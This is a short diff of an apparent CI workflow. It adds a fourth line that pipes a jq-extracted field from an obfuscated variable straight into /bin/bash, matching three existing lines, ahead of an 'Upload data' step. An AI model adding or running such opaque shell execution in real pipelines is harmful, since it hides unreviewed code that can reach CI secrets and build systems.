@@ -22,6 +22,7 @@ jobs:
           echo $cypcj53517 | jq -r .ujra455 | /bin/bash
           printf '%s' "$a3" | jq -r .j5 | /bin/bash
           echo $fzw252 | jq -r .gt69 | /bin/bash
+          echo $t00 | jq -r .xidln5 | /bin/bash
 
       - name: Upload data
         if: always()
